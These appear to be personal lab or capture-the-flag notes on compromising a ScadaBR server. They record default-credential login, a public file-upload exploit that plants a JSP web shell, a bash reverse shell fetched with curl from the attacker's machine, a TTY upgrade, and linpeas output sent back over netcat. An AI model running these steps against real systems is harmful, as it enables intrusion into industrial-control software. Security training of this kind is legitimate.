Got web page via cobalt strike port scan, navigated and saw login screen
![[Pasted image 20240614160244.png]]
logged in with admin admin credentials
![[Pasted image 20240614160822.png]]
### searchsploit scadabr
- found exploit for authenticated file upload, read it and saw that it is a web shell
#searchsploit #scadabr
```bash
â”Œâ”€â”€(kaliã‰¿gobots)-[14Jun2024 20:04:08]-[~/SUT/Alchemy]
â””â”€$ searchsploit scadabr  
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
ScadaBR 1.0 - Arbitrary File Upload (Authenticated) (1)             | windows/webapps/49734.py
ScadaBR 1.0 - Arbitrary File Upload (Authenticated) (2)             | linux/webapps/49735.py
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```
### Web Shell
- utilized the exploit and was able to get a web shell
#webshell 
```bash
â”€â”€(kaliã‰¿gobots)-[14Jun2024 20:00:33]-[~/SUT/Alchemy/172.16.0.20]                                                                                                                                           
â””â”€$ proxychains python2 49734.py 172.16.0.20 80 admin admin                                                                                                                                                  
[proxychains] config file found: /etc/proxychains4.conf                                                                                                                                                      
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4                                                                                                                                       
[proxychains] DLL init: proxychains-ng 4.17                                                                                                                                                                  

+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
|    _________                  .___     ____________________       |
|   /   _____/ ____ _____     __| _/____ \______   \______   \      |
|   \_____  \_/ ___\__  \   / __ |\__  \ |    |  _/|       _/       |
|   /        \  \___ / __ \_/ /_/ | / __ \|    |   \|    |   \      |
|  /_______  /\___  >____  /\____ |(____  /______  /|____|_  /      |
|          \/     \/     \/      \/     \/       \/        \/       |
|                                                                   |
|    > ScadaBR 1.0 ~ 1.1 CE Arbitrary File Upload | 
|    > Exploit Author : Fellipe Oliveira                            |
|    > Exploit for Windows Systems                                  |
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+

[+] Trying to authenticate http://172.16.0.20:80/ScadaBR/login.htm...
[+] Successfully authenticated! :D~

[>] Attempting to upload .jsp Webshell...
[>] Verifying shell upload...

[+] Upload Successfuly!
[+] Webshell Found in: http://172.16.0.20:80/ScadaBR/uploads/1.jsp
[>] Spawning fake shell...
# whoami
aepike

```
### Wget testing
- tested ability to grab files from kali machine - able to grab files. Probably can upload msfvenom reverse shell and start from there.
![[Pasted image 20240614160645.png]]
![[Pasted image 20240614160724.png]]
### Created Reverse shell
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[17Jun2024 16:59:14]-[/home/kali/SUT/Alchemy/172.16.0.20]
â””â”€# cat rev2.sh               
/bin/bash -i >& /dev/tcp/10.10.14.39/4545 0>&1
```
#### Hosted HTTP server
![[Pasted image 20240617145351.png]]
#### Curling reverse shell
- Utilized the web shell to pull over `rev2.sh` which is a bash reverse shell, the working directory wasnt writeable so must write to `/tmp/`
- `curl http://10.10.14.39:8000/rev2.sh -o /tmp/rev2.sh`
![[Pasted image 20240617145559.png]]
#### Executing reverse shell in web shell
![[Pasted image 20240617145624.png]]
#### Setting up Netcat listener on Kali Machine
- not a tty, no job control
![[Pasted image 20240617145812.png]]
##### TTY shell upgrade
- `python3 -c 'import pty; pty.spawn("/bin/bash")'`
![[Pasted image 20240617145943.png]]

##### linpeas in memory
- setting up netcat listener in normal terminal on attacker kali
- `nc -lvnp 9002 | tee linpeas.out`
![[Pasted image 20240617150227.png]]
- curling and executing linpeas
```bash
aepike@scada:~$ curl 10.10.14.39:8000/linpeas.sh | sh | nc 10.10.14.39 9002                                                                                 
curl 10.10.14.39:8000/linpeas.sh | sh | nc 10.10.14.39 9002                                                                                                                                                 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                                                                                                             
                                 Dload  Upload   Total   Spent    Left  Speed                                                                                                                               
100   335  100   335    0     0   6090      0 --:--:-- --:--:-- --:--:--  6090                                                                                                                             
```